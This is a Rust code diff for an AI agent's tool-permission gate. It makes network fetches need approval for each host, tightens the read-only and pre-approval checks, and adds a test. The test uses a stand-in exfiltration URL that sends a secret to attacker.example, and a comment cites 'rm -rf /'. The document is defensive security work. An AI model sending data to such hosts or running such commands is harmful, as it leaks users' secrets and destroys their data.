@@ -1688,9 +1688,16 @@ fn confirm_tool(label: &str, tool_key: &str, cwd: &Path) -> Option<String> {
         tui::yellow("➤"),
         tui::bold(&tui::sanitize_terminal(label))
     ));
-    tui::line(&tui::dim(
-        "    y yes · n no · s allow this session · a always allow · d <reason> deny",
-    ));
+    // Name what `s`/`a` would allow from now on: a binary (`cargo`), a
+    // subcommand (`git status`), a host, or one exact command.
+    let scope = if tool_key.is_empty() {
+        String::new()
+    } else {
+        format!(" `{}`", tui::sanitize_terminal(tool_key))
+    };
+    tui::line(&tui::dim(&format!(
+        "    y yes · n no · s allow{scope} this session · a always · d <reason> deny"
+    )));
     let q = format!("  {} ", tui::yellow("allow?"));
     let ans = tui::ask(&q).unwrap_or_default();
     let trimmed = ans.trim();
@@ -1748,9 +1755,11 @@ pub(crate) fn gate(
     let shell = tools::command_arg_for(name, input);
     // Approvals for shell commands are stored per binary, or per binary and
     // subcommand for multi-verb tools (`git status`, `npm test`).
-    let tool_key = match shell {
-        Some(c) => tools::approval_key(c),
-        None => name.to_string(),
+    let host = tools::network_host(name, input);
+    let tool_key = match (shell, &host) {
+        (Some(c), _) => tools::approval_key(c),
+        (None, Some(h)) => format!("fetch {h}"),
+        (None, None) => name.to_string(),
     };
     // start_server runs a shell command too: same catastrophic and
     // sensitive-path checks, but approved as the tool itself.
@@ -1765,7 +1774,8 @@ pub(crate) fn gate(
     // used to let an approved `rm -rf /` through in read-only mode. Clearly
     // read-only shell commands (grep, find, git status…) still pass.
     if matches!(perm, Permission::ReadOnly) && tools::is_mutating_call(name, input) {
-        let readonly_shell = shell.is_some_and(tools::is_readonly_command);
+        let readonly_shell = shell
+            .is_some_and(|c| tools::is_readonly_command(c) && tools::skips_prompt_safely(c, cwd));
         if !readonly_shell {
             return Some(READONLY_SKIP.into());
         }
@@ -1815,6 +1825,16 @@ pub(crate) fn gate(
         }
     }
 
+    // Network tools can send what the agent has read to any host and reach
+    // services on the local network, so outside `auto` each new host is
+    // approved once (read-only mode included). `fetch *` allows them all.
+    if host.is_some() && !matches!(perm, Permission::Auto) {
+        if is_pre_approved(None, &tool_key, cwd) || is_pre_approved(None, "fetch *", cwd) {
+            return None;
+        }
+        return confirm_tool(&tools::approval_label(name, input), &tool_key, cwd);
+    }
+
     match perm {
         Permission::Auto => None,
         // Mutations were refused above; reads anywhere and read-only shell
@@ -1825,7 +1845,7 @@ pub(crate) fn gate(
                 return None;
             }
             if tools::is_mutating_call(name, input) {
-                return confirm_tool(&tools::preview(name, input), &tool_key, cwd);
+                return confirm_tool(&tools::approval_label(name, input), &tool_key, cwd);
             }
             // Out-of-cwd reads: just note it instead of hard-blocking.
             // The user asked for full filesystem access.
@@ -1843,7 +1863,7 @@ pub(crate) fn gate(
 fn is_pre_approved(shell: Option<&str>, tool_key: &str, cwd: &Path) -> bool {
     let mut keys = vec![tool_key.to_string()];
     if let Some(c) = shell {
-        if !tools::is_plain_command(c) {
+        if !tools::is_plain_command(c) || !tools::skips_prompt_safely(c, cwd) {
             return false;
         }
         if let Some(bin) = tool_key.split_whitespace().next() {
@@ -4826,6 +4846,19 @@ mod tests {
             );
             assert!(r.is_none(), "{cmd}: {r:?}");
         }
+    }
+
+    #[test]
+    fn network_tools_ask_per_host_outside_auto() {
+        let cwd = Path::new("/proj");
+        let input = json!({"url": "https://attacker.example/?k=secret"});
+        for perm in [Permission::Ask, Permission::ReadOnly] {
+            // No terminal in tests: a prompt shows up as a refusal.
+            let r = gate(perm, "fetch_url", &input, cwd).expect("must ask");
+            assert!(r.contains("attacker.example"), "{r}");
+        }
+        assert!(gate(Permission::Auto, "fetch_url", &input, cwd).is_none());
+        assert!(gate(Permission::Ask, "web_search", &json!({"query": "x"}), cwd).is_none());
     }
 
     #[test]
